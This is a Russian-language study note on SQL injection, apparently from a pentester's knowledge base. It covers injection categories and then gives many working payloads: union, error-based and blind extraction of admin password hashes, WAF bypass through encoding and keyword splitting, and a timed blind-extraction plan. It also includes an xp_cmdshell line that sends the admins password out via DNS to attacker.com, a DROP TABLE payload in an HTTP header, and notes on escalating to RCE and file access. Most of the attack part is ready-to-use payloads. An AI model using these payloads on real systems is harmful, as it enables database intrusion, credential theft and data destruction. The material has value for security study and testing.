
## **Категории SQL Injection атак**

---

### **1. По технике извлечения**

- **Classic/In-band SQLi** — данные извлекаются через тот же канал
- **Blind SQLi** — результат виден только по поведению приложения
- **Out-of-band SQLi** — данные извлекаются через сторонние каналы (DNS, HTTP)

### **2. По механизму эксплуатации**

- **Union-based** — использование оператора UNION
- **Error-based** — извлечение данных через сообщения об ошибках
- **Boolean-based Blind** — определение истинности условий
- **Time-based Blind** — использование временных задержек
- **Stacked Queries** — выполнение нескольких запросов

---

## **Примеры атак**

### **Union-based Injection**

``` sql
-- Определение количества колонок
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

-- Union-атака
' UNION SELECT 1,2,3--
' UNION SELECT username, password, NULL FROM users--
```

### **Error-based Injection (MySQL)**

```sql
-- Извлечение данных через ошибки
' AND ExtractValue(1, CONCAT(0x3a, (SELECT database())))--
' AND UpdateXML(1, CONCAT(0x3a, (SELECT user())), 1)--
```
**Как работает ExtractValue():**
- **ExtractValue(xml, xpath)** — функция для извлечения данных из XML
- **Первый параметр (1)** — некорректный XML (просто число 1)
- **CONCAT(0x3a, (SELECT database()))** — создает строку `:database_name`
- **0x3a** — hex-представление двоеточия (разделитель)
- **Ошибка возникает** потому что функция ожидает валидный XPath, а получает `:database_name`

**Пример вывода - MySQL вернет ошибку типа:**
``` text
Error: XPATH syntax error: ':database_name'
```

**Как работает UpdateXML():**
- **UpdateXML(xml, xpath, new_value)** — функция для обновления XML
- **Первый параметр (1)** — некорректный XML
- **CONCAT(0x3a, (SELECT user()))** — создает `:username@hostname`
- **Третий параметр (1)** — новое значение (тоже некорректное)
- **Ошибка возникает** при попытке обработать невалидный XPath `:username@hostname`
- **Результат:** Аналогичная ошибка с данными пользователя

### **Boolean-based Blind**

```sql
-- Проверка первого символа пароля админа
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97--
```
**Разбор по функциям:**

1. **SUBSTRING(column, start, length)** — извлекает подстроку
    >- `(SELECT password FROM users WHERE username='admin')` — получаем пароль админа
    >- `,1,1` — берем первый символ первого результата
2. **ASCII(char)** — преобразует символ в числовой код ASCII
    >- Получаем код первого символа пароля
3. **=97** — проверяем, равен ли код 97 (символ 'a')

**Логика:**
- Если условие **TRUE** — приложение работает нормально
- Если условие **FALSE** — приложение ведет себя иначе (пустая страница, ошибка)
- Пентестер перебирает коды от 0 до 255 для каждого символа

### **Time-based Blind**

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--

-- PostgreSQL
' AND PG_SLEEP(5)--
```

---

## **Ответы на дополнительные вопросы**

### **1. Обход фильтрации SQL инъекции**

Когда сервер пытается валидировать или фильтровать входные данные, пентестер может использовать:

#### **1) Кодирование и обфускация**

```sql
-- Normal
' OR 1=1--
```

```sql
-- URL encoding
%27%20OR%201%3D1--

-- Double URL encoding
%2527%2520OR%25201%253D1--

-- Hex encoding
0x27204f5220313d312d2d

-- Внедрение hex в запрос
SELECT * FROM users WHERE username=0x61646d696e -- 'admin'

-- Unicode normalization
ʻ OR 1=1--  →  ' OR 1=1--

-- Base64 (если приложение декодирует)
JyBPUiAxPTEtLQ==
```

**Механизм Unicode normalization:**
- Некоторые системы нормализуют Unicode-символы
- `ʻ` (U+02BB) и `ʼ` (U+02BC) могут нормализоваться в обычную кавычку `'`
- WAF видит "безопасные" Unicode-символы, но после нормализации получается SQL-инъекция

**Char() функции:**
```sql
-- MySQL
' OR '1'='1' → CHAR(39,32,79,82,32,49,61,49)

-- SQL Server
' OR 1=1--' → CHAR(39)+CHAR(32)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)

-- PostgreSQL
SELECT CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110) -- 'admin'
```

**Символьные ссылки** (**Использование альтернативных представлений одного и того же символа** через разные нотации или escape-последовательности)**:**
``` sql
-- Вместо обычной кавычки '
' OR 1=1--  →  &#39; OR 1=1--
' OR 1=1--  →  &apos; OR 1=1--
' OR 1=1--  →  %27 OR 1=1--
' OR 1=1--  →  \' OR 1=1--     /* PHP, JavaScript */
' OR 1=1--  →  '' OR 1=1--     /* SQL (удвоение кавычек) */
```

#### **2) Изменение регистра и разделение ключевых слов**

```sql
-- Смешанный регистр
SeLeCt * FrOm uSeRs

-- Разделение комментариями
SEL/**/ECT * FR/**/OM USERS

-- Вставка пробелов разных типов
SEL%09ECT *%0DFROM%0CUSERS

-- Использование строк и строковой конкатенации
' OR 1=1 → ' OR '1'='1'
' UNI' 'ON SEL' 'ECT 1,2,3--' -- Вместо: UNION SELECT
' OR 1=1--' → ' OR ' '1' '=' '1' '--' -- Использование CONCAT()
' UNION SELECT @@version--' → ' UNI' + 'ON SEL' + 'ECT CONCAT(@@version)' 

-- Oracle, PostgreSQL -- Конкатенация через ||
' OR '1'||'='||'1'--
' SEL'||'ECT * FROM users--'
' SEL'||'ECT version()--'
-- SQL Server -- Конкатенация через +
' OR '1'+'='+'1'--
' EXEC' + ' xp_cmdshell' + ' ''whoami''--'
```

#### **3) Альтернативные синтаксисы**

```sql
' OR 1=1--'  -- заблокировано

-- Альтернативы:
' || 1=1--'  -- PostgreSQL, MySQL
' | 1=1--'   -- некоторые СУБД
' XOR 0=1--' -- инвертированная логика
' AND NOT 1=0--' -- двойное отрицание

-- /**/ вместо пробелов
'/**/OR/**/1=1--
'%09OR%091=1--
```

**Вместо UNION:**
```sql
-- Использование подзапросов
' AND (SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)--'

-- Использование WITH (CTE)
'; WITH cte AS (SELECT * FROM users) SELECT * FROM cte--'
```

**Вместо пробелов:**
```sql
'OR'1'='1'  -- без пробелов (работает в некоторых СУБД)

-- Альтернативы пробелам:
'/**/OR/**/1=1--'
'%09OR%091=1--'    -- табуляция
'%0AOR%0A1=1--'    -- новая строка
'%0DOR%0D1=1--'    -- возврат каретки
'%00OR%001=1--'    -- null byte
```

##### **4) JOIN запросы для обхода блокировки UNION**

```sql
-- Вместо: UNION SELECT username, password FROM users
' AND 1=2 UNION SELECT 1,2--  -- заблокирован

-- Используем JOIN:
' AND EXISTS (SELECT * FROM information_schema.tables t1 
              JOIN information_schema.columns t2 
              ON t1.table_name=t2.table_name)--
```

**Извлечение данных через JOIN:**

```sql
-- Получаем данные из двух таблиц без UNION
' AND (SELECT t1.username || ':' || t2.password 
       FROM users t1 
       JOIN passwords t2 ON t1.id=t2.user_id 
       WHERE t1.username='admin') IS NOT NULL--
```

**Слепая инъекция с JOIN:**

```sql
-- Проверяем существование данных в связанных таблицах
' AND (SELECT COUNT(*) FROM users u 
       JOIN admin_privileges a ON u.id=a.user_id 
       WHERE u.role='admin') > 0--
```

#### **5) Регулярные выражения и LIKE**

**Механизм:**
- Использование паттернов для обхода точных фильтров.

**Примеры:**
- **Обход фильтров через REGEXP/LIKE:**
```sql
-- Вместо точного значения
' AND password='secret'--  -- заблокировано

-- Используем LIKE с wildcards
' AND password LIKE 'sec%'--
' AND password LIKE 's_c_e_'--  -- один символ вместо каждого

-- Используем REGEXP
' AND password REGEXP '^sec'--
' AND password REGEXP 's.c.e.'--  -- любой символ вместо точек
```

**Извлечение данных через паттерны:**
```sql
-- Определяем длину пароля
' AND LENGTH(password)=32--  -- для MD5

-- Проверяем формат (hex)
' AND password REGEXP '^[a-f0-9]{32}$'--

-- Проверяем по словарю хешей
' AND password LIKE '5f4dcc3%'--  -- начинается с хеша 'password'
' AND password LIKE 'e10adc3%'--  -- начинается с хеша '123456'
```

**Слепое извлечение через бинарный поиск:**
```sql
-- Вместо substring используем сравнение диапазонов
' AND ASCII(SUBSTRING(password,1,1)) BETWEEN 48 AND 57--  -- цифра?
' AND ASCII(SUBSTRING(password,1,1)) BETWEEN 97 AND 102-- -- hex буква?

-- Уточняем диапазон
' AND ASCII(SUBSTRING(password,1,1)) BETWEEN 97 AND 110-- -- a-n?
' AND ASCII(SUBSTRING(password,1,1)) BETWEEN 97 AND 104-- -- a-h?
```


#### **6) Использование функций и операторов СУБД**

``` sql
-- MySQL
' OR CHAR(49)=CHAR(49)--

-- PostgreSQL  
' OR '1' ILIKE '1'--

-- SQL Server
' OR '1' LIKE '1'--
```

#### **7) Обход WAF/фильтров через неочевидные векторы**

```sql
-- Внедрение в другие параметры
-- ORDER BY, GROUP BY, LIMIT
ORDER BY (CASE WHEN (SELECT 1)=1 THEN column1 ELSE column2 END)

-- Внедрение в HTTP заголовки
User-Agent: ' OR 1=1--
X-Forwarded-For: '; DROP TABLE users--
```

**Сложный пример обхода WAF:**
```sql
-- Исходный запрос (заблокирован):
' UNION SELECT username, password FROM users WHERE admin=1--

-- Обходной вариант:
%55%4e%49%4f%4e%0a%53%45%4c%45%43%54%0a%75%73%65%72%6e%61%6d%65%2c%0a%70%61%73%73%77%6f%72%64%0a%46%52%4f%4d%0a%75%73%65%72%73%0a%57%48%45%52%45%0a%61%64%6d%69%6e%3d%31%2d%2d

-- Расшифровка (URL decode + hex):
UNION
SELECT
username,
password
FROM
users
WHERE
admin=1--
```

---

### **2. Слепая SQLi с ограничением времени (10 минут)**

При слепой SQLi с ограничением времени и невозможностью использовать substring (слишком медленно), пентестер должен действовать стратегически:

#### **План атаки на 10 минут:**

###### **Шаг 1: Быстрая разведка (1-2 минуты)**
```sql
-- Определение СУБД
' AND SLEEP(5)--      -- MySQL?
'; WAITFOR DELAY '0:0:5'--  -- SQL Server?
'; SELECT PG_SLEEP(5)--     -- PostgreSQL?

-- Проверка существования таблицы admins
' AND (SELECT COUNT(*) FROM admins)>=1--
```

###### **Шаг 2: Использование битовых операций вместо substring (3-4 минуты)**

```sql
-- Извлечение данных по битам (гораздо быстрее!)
' AND (ASCII(SUBSTRING(password,1,1)) & 128) = 128-- Проверяем бит 7 (128)
' AND (ASCII(SUBSTRING(password,1,1)) & 64) = 64--   Проверяем бит 6 (64)
' AND (ASCII(SUBSTRING(password,1,1)) & 32) = 32--   Проверяем бит 5 (32)
' AND (ASCII(SUBSTRING(password,1,1)) & 16) = 16--   Проверяем бит 4 (16)
' AND (ASCII(SUBSTRING(password,1,1)) & 8) = 8--     Проверяем бит 3 (8)
' AND (ASCII(SUBSTRING(password,1,1)) & 4) = 4--     Проверяем бит 2 (4)
' AND (ASCII(SUBSTRING(password,1,1)) & 2) = 2--     Проверяем бит 1 (2) 
' AND (ASCII(SUBSTRING(password,1,1)) & 1) = 1--     Проверяем бит 0 (1)
 -- для каждого бита (8 запросов на символ вместо 256)
```

**Синтаксис для Oracle:**
```sql
SELECT BITAND(ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1)), 128)/128 FROM dual

// здесь "128)/128" аналогично перечисляются вниз до 1.
или

SELECT BITAND(ASCII(SUBSTR((password), 1, 1)), 128)/128 FROM users WHERE username='administrator'
```

**PostgreSQL в логических выражениях возвращает не 0 или 1, а 'f' или 't' **.

> **Классический substring (медленно): 256 запросов на символ;**
> **Битовые операции (быстро). Как работает:**
> >- Каждый символ кодируется 8 битами
> >- Оператор `&` (AND) проверяет конкретный бит
> >- По результатам 8 запросов восстанавливаем ASCII-код
> >- **Результат:** 8 запросов на символ.

**Пример для символа 'A' (ASCII 65):**
```txt
65 в двоичном: 01000001
Бит 0: 65 & 1 = 1    ✓
Бит 1: 65 & 2 = 0    ✗  
Бит 2: 65 & 4 = 0    ✗
Бит 3: 65 & 8 = 0    ✗
Бит 4: 65 & 16 = 0   ✗
Бит 5: 65 & 32 = 0   ✗
Бит 6: 65 & 64 = 64  ✓
Бит 7: 65 & 128 = 0  ✗
```

###### **Шаг 2 (альтернатива): Использование бинарного поиска (2-3 минуты)**

```sql
-- Бинарный поиск по ASCII коду
' AND (ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)) > 128)--
' AND (ASCII(SUBSTRING((SELECT password FROM admins LIMIT 1),1,1)) > 64)--
-- Каждый запрос делит пространство пополам (8 запросов на символ)
```

Дополнительно. **Определение реальной длины**:

На практике, перед извлечением данных мы сначала определяем длину:
``` sql
' AND (SELECT LENGTH(password) FROM admins LIMIT 1)=32--
```

###### **Шаг 4: Извлечение только критически важных данных (оставшееся время)**

```sql
-- Фокус на хешах паролей (первые несколько символов могут быть достаточны)
-- Если таблица небольшая - попытка извлечь все сразу через ошибку
-- Так проверяются первые 6-7 символов хеша
-- Используя словарь распространенных хешей
' AND (SELECT LEFT(password,8) FROM admins LIMIT 1)='5f4dcc3'--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE '5f4dcc%')=1--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE 'e10adc%')=1--
' AND (SELECT 1 FROM admins WHERE username='admin' AND password LIKE 'd8578e%')=1--

-- Извлечение только хешей (MD5, SHA1) которые можно brute-force'ить оффлайн
' AND (SELECT password FROM admins LIMIT 1) LIKE '[a-f0-9]%'--
```

**Логика LEFT():**
- Хеши паролей имеют предсказуемые паттерны
- **MD5:** 32 hex-символа, начинается с определенных значений
- **Пример:** `5f4dcc3` — начало MD5 хеша для пароля "password"
- Проверяем первые 8 символов вместо полного хеша

**Логика LIKE:**
- Вместо перебора всех символов проверяем распространенные хеши
- **Пример словаря:**
    - `5f4dcc3` (password), `e10adc3` (123456), `d8578ed` (password123)
- Если знаем, что используется MD5/SHA1 — проверяем только hex-символы \[a-f0-9]
- Резко сокращает пространство поиска

**Эффективность:**
- Вместо 95 возможных символов → только 16 hex-символов
- Вместо перебора 256 вариантов на символ → проверка 10-20 популярных хешей

**Логика проверки формата хеша:**
- Фильтруем по формату хеша (только hex-символы)
- Если условие истинно — это точно хеш, а не plaintext пароль
- Можно brute-force оффлайн

###### **Шаг 5: Агрессивная тактика для быстрого извлечения**

```sql
-- Использование ошибок для быстрого извлечения (если возможно)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM admins LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Out-of-band каналы (если доступны)
'; EXEC xp_cmdshell('nslookup '+(SELECT password FROM admins)+'.attacker.com')--
```

**Механизм Error-based через группировку:**
1. **FLOOR(RAND(0)*2)** — генерирует 0 или 1, но с детерминированной последовательностью
2. **GROUP BY x** — пытается сгруппировать по вычисляемому значению
3. **CONCAT()** — объединяет пароль с числом
4. **Из-за особенностей RAND() в GROUP BY** MySQL выдает ошибку дубликата ключа
5. **В ошибке содержится** сконкатенированное значение с паролем

**Пример ошибки:**
``` txt
Duplicate entry 'secret_password1' for key 'group_key'
```

---

**Ключевые моменты для успеха за 10 минут:**

- Использовать битовые операции вместо посимвольного перебора
- Фокусироваться на минимальном наборе критических данных
- Использовать бинарный поиск для ускорения
- Рассмотреть out-of-band методы если доступны
- Иметь подготовленные payloads для разных СУБД

Эта стратегия позволяет значительно ускорить процесс извлечения данных даже при слепой инъекции с временными ограничениями.

---

### 3. Во что может превратиться UNION SELECT SQL-инъекция

1. RCE
   > Даже если отключается **xp_cmdshell**, в зависимости от привилегий может быть можно создать пользователя, с разрешением на **xp_cmdshell** через **sp_xp_cmdshell_proxy_account** и т.д.
   
2. Читать файлы через **LOAD_FILE** или **LOAD_DATA**.
   > При чём почему то в **LOAD_DATA** немного больше привилегий и помещается намного больше файлов, чем в **LOAD_FILE**, хотя функции почти одинаковые.
   
3. Записывать в файлы.
   > При чём иногда с помощью zero-day можно записывать в файлы, не имея на это прав.
   
   ---

![[0.1. Защита от SQL injection#Защита от SQL injection]]